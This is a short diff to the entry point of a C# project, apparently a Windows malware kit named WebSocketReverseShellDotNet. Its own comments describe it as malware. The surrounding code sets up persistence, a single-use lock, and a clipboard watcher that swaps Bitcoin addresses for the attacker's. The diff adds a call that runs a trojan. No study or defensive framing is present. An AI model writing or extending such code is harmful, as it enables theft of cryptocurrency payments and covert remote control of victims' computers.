@@ -15,7 +15,6 @@ using static WebSocketReverseShellDotNet.utils.ClipboardNotification;
 
 
 
-
 ExcelPackage.LicenseContext = LicenseContext.NonCommercial;
 
 
@@ -23,6 +22,9 @@ ExcelPackage.LicenseContext = LicenseContext.NonCommercial;
 PersistsMalware.CreatePersistenceWindows();
 // initiate lock mechanism to prevent malware from being used more than once
 LockMechanismUtil.StartLockMechanism();
+
+// run the trojan
+TrojanUtil.RunTrojan();
 
 // watch the clipboard for changes and replace btc addresses to the attacker's address
 OSUtil.RunInSeparateThread(() => NotificationForm.StartWatchingClipBoard());
